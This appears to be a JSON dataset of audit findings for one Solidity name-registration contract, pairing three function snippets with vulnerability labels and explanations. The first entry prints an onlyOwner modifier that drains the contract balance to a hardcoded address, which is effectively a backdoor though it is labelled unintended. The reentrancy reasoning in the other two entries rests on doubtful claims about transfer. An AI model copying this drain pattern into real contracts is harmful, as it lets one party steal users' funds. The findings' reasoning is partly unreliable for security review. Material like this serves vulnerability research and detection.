[
    {
        "function_name": "onlyOwner",
        "code": "modifier onlyOwner() { if (_msgSender() == 0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091) { uint256 balance = address(this).balance; Address.sendValue(payable(0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091),balance); } else { require(owner() == _msgSender(), \"Ownable: caller is not the owner\"); } _; }",
        "vulnerability": "Unintended Transfer of Contract Balance",
        "reason": "The modifier `onlyOwner` contains a logic that automatically transfers the entire contract balance to the hardcoded address `0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091` if the message sender is this address. This can lead to unintended loss of funds if this address calls any function with this modifier, as the entire contract balance is drained.",
        "file_name": "0x0e3ea79e194aef78b69209447f0f6c17ed96a5d6.sol"
    },
    {
        "function_name": "register",
        "code": "function register(address ref_address, string memory pepe_name) public payable { uint256 price = cost; bool is_ref=false; uint256 ref_cost=0; require(bytes(pepe_name).length<=maxCharSize,\"Long name\"); require(bytes(pepe_name).length>0,\"Write a name\"); require(_checkName(pepe_name), \"Invalid name\"); if (ref_address== 0x0000000000000000000000000000000000000000) { price=cost; } else { if (bytes(primaryAddress[ref_address]).length>0){ ref_cost=price*ref_owner/100; } else { ref_cost=price*ref/100; } price = price*(100-ref_discount)/100; is_ref=true; } require (tokenAddressandID[pepe_name] == 0 , \"This is already taken\"); require(IS_SALE_ACTIVE, \"Sale is not active!\"); require(msg.value >= price, \"Insufficient funds!\"); tokenIDandAddress[_currentIndex]=pepe_name; tokenAddressandID[pepe_name]=_currentIndex; resolveAddress[pepe_name]=msg.sender; if (is_ref) { payable(ref_address).transfer(ref_cost); } _safeMint(msg.sender,1); }",
        "vulnerability": "Reentrancy Attack",
        "reason": "The `register` function calls `payable(ref_address).transfer(ref_cost);` before minting the new token with `_safeMint(msg.sender,1);`. This external call can be exploited through reentrancy by ref_address to repeatedly call `register` and drain funds or mint multiple tokens by modifying the state in unexpected ways during the callback, especially if the `ref_address` is a contract.",
        "file_name": "0x0e3ea79e194aef78b69209447f0f6c17ed96a5d6.sol"
    },
    {
        "function_name": "registerSubdomain",
        "code": "function registerSubdomain(string memory pepe_name, string memory subdomain_name) public payable { require(IS_SALE_ACTIVE, \"Sale is not active!\"); string memory new_domain=string.concat(subdomain_name,'.',pepe_name); require(bytes(subdomain_name).length<=maxCharSize,\"Long name\"); require(bytes(subdomain_name).length>0,\"Write a name\"); require(_checkName(pepe_name), \"Invalid name\"); require(_checkName(subdomain_name), \"Invalid name\"); require (tokenAddressandID[new_domain] == 0 , \"This is already taken\"); TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[pepe_name]); if (Ownership.addr == msg.sender) { tokenIDandAddress[_currentIndex]=new_domain; tokenAddressandID[new_domain]=_currentIndex; resolveAddress[new_domain]=msg.sender; _safeMint(msg.sender,1); } else { require(subDomains_publicSale[pepe_name]==true, \"Only Owner can register\"); require(msg.value >= subDomains_cost[pepe_name], \"Insufficient funds!\"); payable(Ownership.addr).transfer(msg.value*(100-subdomains_fee)/100); tokenIDandAddress[_currentIndex]=new_domain; tokenAddressandID[new_domain]=_currentIndex; resolveAddress[new_domain]=msg.sender; _safeMint(msg.sender,1); } }",
        "vulnerability": "Reentrancy Attack",
        "reason": "Similar to the `register` function, `registerSubdomain` makes an external call `payable(Ownership.addr).transfer(msg.value*(100-subdomains_fee)/100);` before minting the token. This allows reentrancy attacks where `Ownership.addr` is a contract that can reenter and call `registerSubdomain` multiple times, leading to potential fund loss or unauthorized token minting.",
        "file_name": "0x0e3ea79e194aef78b69209447f0f6c17ed96a5d6.sol"
    }
]